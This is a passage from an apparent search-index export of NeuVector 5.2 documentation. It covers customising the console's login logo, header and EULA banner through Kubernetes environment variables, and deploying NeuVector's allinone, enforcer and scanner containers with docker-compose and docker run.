rfZwPYNGDDAM2zYsC9ziCB8wUh3yYrxGHTpOMpymmFNzaveNXXNiRTuqmLEovKvpLpLvSmu0vetTCQstdOwdMHASka7yoNO/Xt2NT6xfGfjcacYFvUJZb9TnbNJRxmWFfisNGgHG9hrQ4cO1U+QCPFKirtkIcxI/QCa5il9zSmGpToH0hce7gODqoMh3NYNot2KsmHpSvWUNaS4SvaqDWFibliHr8+jflC+6pBNYBy/g2Zz0g53RGpYZpKSkoZSO1DAPy4hTkldUjqZzOihzGMjM3D04hTDmpp3Yonq37LSX1qZQSRCW3U4CsrIyPD2Vhtvwchl5aPTcNSJ+KgZZKq75BC1nbnzYmOsDYv6kXfw2q/CNSwYRjPMw81JO9yJOh/w+wBgfJ/xW1ugncWo8wknhXhmpKcyRRlWduWfKT3KU3rFKVNC1UGvt6eVCbQlGNN7dJYvw1Pbvt9C8Plj6CwjpqFWn2NH3FJCzKeEh5vV738UH8ER1iYYh/obsQPi34Je5GQAaOd/+a0tYJTfQp2w+it0U9KXlQ9XhgXTmZhTuYDynGJY0wqqn6X+pHrKXVZG4FOqq/TzsVnVAWfvOoORrtJfWPXHrNTMivkUm7mj4d9ibVjUj5X7Lr8YiWERZBowj9GcDEkbBtMrHAOC8f0M2sBJIZ5Jc5X19xkWGQvljXKXnXGCYdEZQtVJoAa/u+zzVFfZr9M85Us521Gk5FbdkeYufRVHY+8ow3KV3aL8ZcWn7o71WcLCI9fnoCs9qL1IDYuA0XwO01rDySAGDhz4bd2MqA5Uw0lFnz59fL9NjUQy6MJe4t57702CUd1CzN9zFrX1G+hzTgrxxvCCki+ZDQtGspjynWJYOMp6W3W0C+Pe0fDrWBpWYXGzOqmCz7veXsMiBgwYsBCm8VOIDMcvmMvPYWZZHOaHy+s5GQDyZ6Lej31t+IS8T/EadM8k8n5L5ZwU4g3dsMhAKB9HWRVOMCzzUVZXxLW5vn+sr8PKP3z9O4sWNfaiz4mGYQlCzNANi0xjWl7NNCpLzyy77QTDmlZw8jXV2S6IZ0fjn2NqWIea36V+4CjvqhiW0C3QDYtugaH8dPf35znBsOhKd9XRLsbCosN9Yn2l+/riywO93hd601X3AYZ1sPnfuZu2wDRsLVTbimowhbN1iw1ivVrdNsVV/VjFaKL+PMzhfpBHF6NaxYcUpsCLuImwSE5Ovhv16/C5b+HVN9X9DGqA1GU7ofB9vh2hvVKu1v1Jz6zYpRvW7ILj6u54pxjW9IKa/1Kd7ULE/taca3+gfizdeuG6bli0RLXqpE0waJ9LSkrKHzhwYLJZyLsfGoUBMxH6CQYPDcrnuFoQKH8FWofBPNCuuKof+gy9H2ah/Gvow8Pcl//maupHfKv2SRRrlU/Ctn+Fm7DF4MGD70J7t7FfXu7bt2/QrVugF8rmcf+Oc14QofqkC595H1eLA7zenkGGVVSnjmpSMysecIJhUZ+mrD8V9MfrVOgex1gbFujh9Ro9aVWJAMM60BT2RZhsWLYuHO3Xrx+dKVR3EeggnwxrBScjggYyv20TxO6HKXzEyVYJp81QYB/9iNuytbwP+karrH7IyQCi1aduyYTsyjO6Yc1+uu7bVOYUw5pRePJT1dkugHt74yexNizqx6LNZ1/QDavQe7Wf6mQYhGNYDB1lBA045HWqYREUT0c9nLQk3DatQBu5kbSDOoes6kWjT90a3bBopU7KpxUJnGBYpJlrT06eXnB66PSN1poXoZZayavrsi25vI1/EevlZeh3KzozuHjLObXQoN+w9l62vXCemQgMi44ePsOgK+akAumYGBb68k1OWhJum1ZQG5gCJnIyLFCX1rCna9L8RKNP3ZqHVx77kW5Y8zacpgsOE9KXl3/iBMMyr4dla8VRbIN5ieSuvqa7PcO69hv6zhZsPPVysGE1jaCycInEsDDgvg6j+D9OKpDX2YbVk+NDLiEdZptBYN/Mb08bqH8A+yrgoR3t7VP3xzB66Ia1cNNp9VsE3cIjhtU1DCu3qllNf2j7zIaFzwv5FJtQRGJYIGiJGaQ71bBgAh9Alvc0mmmvOeAzzqONg5yMCL0P7e1TXAADeTnQsM7gj/58IZWNXV7xuhiWsw0L+iF9V3OK6t7QDStn55UMKouECA3LahC+gsF9A+3tsSOuFgC1iTZ2tKGXOO4prhaS9poDPuef0UY4j0ELQu8Dpa32iS7EtesfQJeGVjfQDQsDVh1lpeRW3SWG5WzDyvC2LJ1D264bFuVHCgZGJIYVtCYW0lE5wkpMTHygNcE8wr4RXu9nuOAzL6CN/ZyMCL0P7e1T3PDompNvaIZlLNl6Qf23G5NV8ZwYljMNK7+4Sa1vP2Nt7cu6Ybm3N9g60miNSAwLg/gbGHTvc1KBdKf/6G6H9raJ+ovb0wb21V5IfsOKhPSihj66YdGgVIVeb08xLGcaFl13RV8R7RfdsNR31w4iMSwMuFsYhAFGibxuaVgEtYF9FNGTiVCXVrQIWFW1I7az2wIj+L1uWBiIauXMcdkVl8SwnGVYecVNB+i7mZ5/8m+DDGvrOcuVEsIhXMPq27fvX2PAqeV1zCCv2xoWpqPrI2kH+3W/Vb2O2M5uCz0ZWTcsGnxcDNMSw3KSYfHXkjAN+0s3LC5qF+EYFo6qfojBZnlGEvnd1rAIbPuL3JatJ3Ej9hDqBFz64aMjtrNb89jT9Z/qhoXBtpPKxmaW1ohhOcOwkFY3vk5effyCbljYnh9QWXshw6Lp3dChQ5PMGjJkSH8MLLp3byJef0WDDO93c7UgUE6GVai3E0pc1Q99Br+NGtFsE8auFifEK50NHcTZAaB8FsVAZzkriGj2KS6Yt/bYYN2waGBxcYIYljMMq+XbMHpMwn7UDaulrP1g8BRBra0UcBKDUy2v3RaIj8pqDfw2anREm3RDMqjH/vkIr+bFCemM4nc5rFUQE/U+dXusDCtn35WtVDY2qzxHDCvGhvXMtbX0XUzIOVqjGxa2tcuv1ioIYfH4llN/pRsWDR4uThDDip1h4X3LigiG0YP2t25YqkwQ4g0rw1p94Jo6pB2TW/VNMawYGdb+pgn0HYzNqqjSDWvOujrL5V0ihX7DMk9rWhOmO+9CLw618bRmq/p2xU34sYqxoZ9wdYVFuS1h3+RzE34s4kKu54Z9VmqOxxT7KBdZQU8dUmuPtSb6Djg2CLpB26qOHXETzubJLWczdMOi6364OCFj5dEHI9U0v2pbVBie5ralTaG1eNP58OX9Qp6IdVVpJWl/ZOLdnzAuq1L9gzAb1vSCki9xcVSwa1iabkPKVK3QYsMSN+HHKsaGOtOwyERaPQFi17AQ95o5ri0hXj0qz0y3NyzCyrAKDjVXc7EQI9LdFbVWhsXFUSNCw1LCoLH8O7GKtStuwo9VjA11qmGRsC++wSEB2DEs5AcdVeGzx3OxAnn0tKGAGLQdcPFuXBiWa9v5Jbph+R7OSY9+H+UuM9Rj7vXHg2W1rKPlvzre/5uXefqoTR1900YMQDVlzGuZMrZMF9VDKdRU0WqaOKuo1jQ9rAuYGpqnhUFTws1n1HRQTQUhy2mgbwqoT//8Uz9M+6CWaZ95ymea7vFUbxVP9fRpnrpqHfpiqRh+mMRhfnoztO7IDf8fDj30Vjes6QXH/pKLo4ZuWBhQH3NREBgg75hjSaivHmxiRo+BnuCisNHb4uywiEYbPvS2zEpOTr6bw/zYNKyAdjg7CJTNDBVrZVhc1L0Qw+oahsVFUSUcwyIwAN8zx5O4yI9eDsWFYZE4zE8khoWYb3GRTi98X7vN4nxF/BiWt2GPGJazDWtKQfVULooq4RoWUI+jN2vEiBF3cplCL4e6rWFh/9GtSv40DCpg5Vc7hoWYN80xPiF/D0RP4bF1dX3cGBYhhuVsw+LsqBOBYQUNWgyquVyk0MvtiqsHYBUXSlwtAKs4GzrD1QPQ44YNG/Zl7LMscx72x39wuC3DIhD3J3NcK7qNuF14HczVAoj0Nyx6Og830XXI2X2pXgzLmYaFfbiRs6NONAwLdRZykUIvtyuuHoBVXChxtQCs4mzItmFxPt2aZC5Ta97bNSwCZQsQc8sc35rQ7juoEvBIt7gyLLoFRAzLmYbFWR1CNAwLCnrIgll0VADR8w1DiqsHoLcFvRFKXC0A5Ae0YfXZurAfLH9H0tvyGRahlyUmJj6Otmwblhm6/Yf78nNzfV0crrAyLN/2hBKq3tHSQhcDA+2GGJazDGtCztEOffJvBIal1nM3i/P96OVQt/0Ny2xYhF4OQ6gyp+0alhUwpIDfy0j4/vxPr46r37B8iGE5y7A42WGEa1jmWI7/Hy7yo8dAcWNYIOikhFm6YSGvSYv5BRdZgu9rrxbvf9xanBpW06tiWM4wrLFZFVc42WHYNKzeycnJD5rjfEJZ0Bksi7h4Miz63SpNj/PJwrBo6YeAGHosPxfr9NBj8f1N57L4NCxCDMsZhsVvOxTdsMIRBqbl1d1WsXbFTfhpq9wOehthqImb8KPHWBkWgf2ar8eSdMMisB9/aRWL/Bt4fRzKhWipZT3mD9yEwsqw7Gr48OFRveWrUyk83Kx2hBhWTA3Lf2q8I4nQsJ7n6pZYxNsWN+GnrXI76G2EoYgNi4A5/aseb2VYBMoq9dhQgpm9xFX9xK1h+RDDip1hdRb4Y83BH/+RUEJMMV7pmYCTuFpIEE9nxiISN+GnrXI76G2EoRxuwo95v5CQpR6/1hqIedYcD8MKuAREBzGboL/DZweZCvI/xut2Dg1i8ODBd6HcajvaFKqH3A5BEARBEARBEARBEARBEARBEARBEARBEARBEARBEARBEARBEARBEDqAhIT/ByWbSc1AOz7RAAAAAElFTkSuQmCC"/>
  </svg>

 restartPolicy: Always   Apply the changes:  kubectl apply -f neuvector-containerd-k8s.yaml   This will apply the customization changes to the UI pages.  ","version":"5.2","tagName":"h3"},{"title":"Verification​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/5.2/configuration/customui#verification-1","content":" To verify that the environment variables have been successfully set, you can run the following command:  kubectl get deployment -n neuvector neuvector-manager-pod -o yaml   Check the spec.template.spec.containers.env section to ensure that the desired environment variables are present.  spec: progressDeadlineSeconds: 600 replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: neuvector-manager-pod strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: creationTimestamp: null labels: app: neuvector-manager-pod release: neuvector spec: containers: - env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector - name: CUSTOM_PAGE_HEADER_COLOR value: '#ff8c00' - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   Console/UI pages after customization:​  Please note that the example is for demonstration purposes only. Make sure to adjust the values according to your needs.   ","version":"5.2","tagName":"h3"},{"title":"Docker & Mirantis Kubernetes Engine","type":0,"sectionRef":"#","url":"/5.2/deploying/docker","content":"","keywords":"","version":"5.2"},{"title":"Kubernetes Deployment on Mirantis Kubernetes Engine​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/5.2/deploying/docker#kubernetes-deployment-on-mirantis-kubernetes-engine","content":" Follow the instructions in the Kubernetes section.  note NeuVector does not support mixed Kubernetes / Swarm clusters.  ","version":"5.2","tagName":"h3"},{"title":"Deploy NeuVector Containers Using Docker Native or UCP/Swarm​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/5.2/deploying/docker#deploy-neuvector-containers-using-docker-native-or-ucpswarm","content":" Note that native Docker deployment on Mirantis Kubernetes Engine using Swarm DOES NOT support deployment of services with containers in privileged mode, or with seccomp capabilities added. To deploy in this environment, you must use Docker Compose or Run to deploy the NeuVector containers. You can use the remote host deployment (docker-compose -H HOST) to make this task easier.  Here are the sample docker compose configuration files. Note that using docker native does not support deploying the enforcer on the same node as the controller, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Note: The environment variable NV_PLATFORM_INFO=platform=Docker is used to notify NeuVector that the platform is Docker/Swarm, even though there may be unused Kubernetes containers detected by NeuVector on a Docker EE deployment. Also to be able to see these in Network Activity -&gt; View -&gt; Show System, add the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Deploy Allinone for High Availability​  For HA in production Docker native or EE environments, deploy the Allinone container on the first three production hosts. Each Allinone should point to the IP addresses of all Allinone hosts. For example, three Allinone containers is the minimum for HA, and the CLUSTER_JOIN_ADDR should list the three IP addresses separated by comma's. Additional HA Allinone's can be deployed in odd numbers, e.g. 5, 7. The deploy the Enforcer on the remaining hosts in the cluster, in any.  Deploy Allinone using docker-compose (privileged mode)​  The following is an example of the docker-compose file to deploy the allinone container on the first node. Because the allinone container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Note: To expose the REST API in the Allinone, add the port map for 10443, for example - 10443:10443.  Add an enforcer container using docker-compose (privileged mode)​  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  Deploy the NeuVector Scanner Container​  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning. Important: Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  Sample docker run to deploy the scanner on the same host as the controller  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   To deploy the scanner on a different host than the controller, add the environment variable CLUSTER_ADVERTISED_ADDR so the controller can reach the scanner.  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=scanner_host_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   To deploy multiple scanners on the same host as the controller, remove the port mapping and CLUSTER_ADVERTISED_ADDR environment variable.  docker run -itd --name s1 -e CLUSTER_JOIN_ADDR=controller_node_ip neuvector/scanner:latest   Where s1 is scanner 1 (use s2, s3 etc for each additional scanner).  To deploy a stand alone scanner (no controller/allinone), please see the section 